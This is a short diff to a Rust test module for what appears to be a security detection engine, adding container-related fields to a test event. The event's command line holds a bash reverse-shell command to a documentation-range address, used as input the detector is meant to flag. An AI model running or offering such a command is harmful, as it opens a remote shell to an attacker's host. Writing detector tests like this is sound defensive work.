@@ -580,6 +580,10 @@ mod tests {
             dst_domain: None,
             command_line: Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string()),
             event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
         };
         let hit = l1.check_event(&event);
         eprintln!("hit = {:?}", hit);
